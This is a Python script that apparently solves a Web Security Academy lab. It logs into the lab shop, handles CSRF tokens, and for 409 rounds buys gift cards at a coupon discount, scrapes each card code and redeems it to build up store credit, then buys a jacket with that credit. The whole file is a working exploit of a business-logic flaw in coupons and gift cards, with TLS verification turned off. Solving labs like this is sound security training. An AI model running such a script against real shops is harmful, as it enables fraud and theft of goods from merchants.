import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0ac700dd042a5107832a05110051001b.web-security-academy.net/" 
username = "wiener"
password = "peter"
coupon = "SIGNUP30"

login_session = requests.session()

login_url = url + "/login"
r = login_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token in {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":username,"password":password}
r = login_session.post(login_url,verify=False,data=login_data)
print("login success and adding giftcards for 410 times and it can take a while")
for i in range(1,410):
    cart_data = {"productId":"2","redir":"PRODUCT","quantity":"1"}
    r = login_session.post(url+"cart",verify=False,data=cart_data)
    r = login_session.get(url+"/cart",verify=False)
    match = re.search(r'name="csrf" value="(.+)">',r.text)
    csrf_token = match.group(1)
    coupon_data = {"csrf":csrf_token,"coupon":coupon}
    r = login_session.post(url+"/cart/coupon",verify=False,data=coupon_data)
    r = login_session.get(url+"/cart",verify=False)
    match = re.search(r'name="csrf" value="(.+)">',r.text)
    checkout_csrf = match.group(1)
    checkout_data = {"csrf":checkout_csrf}
    r = login_session.post(url+"/cart/checkout",verify=False,data=checkout_data)
    match = re.search(r'<th>Code<\/th>\n.+\n.+\n.+<td>(.+)<.td>',r.text)
    gift_Card = match.group(1)
    r = login_session.get(url+f"my-account?id={username}",verify=False)
    match = re.search(r'name="csrf" value="(.+)">',r.text)
    reedem_csrf = match.group(1)
    giftcard_data = {"csrf":reedem_csrf,"gift-card":gift_Card}
    r = login_session.post(url+"/gift-card",verify=False,data=giftcard_data)
    print(f"gift card added for {i} time")

print("money added now buying jacket")
cart_data = {"productId":"1","redir":"PRODUCT","quantity":"1"}
r = login_session.post(url+"cart",verify=False,data=cart_data)
r = login_session.get(url+"/cart",verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
checkout_csrf = match.group(1)
checkout_data = {"csrf":checkout_csrf}
r = login_session.post(url+"/cart/checkout",verify=False,data=checkout_data)
print("order placed for jacket")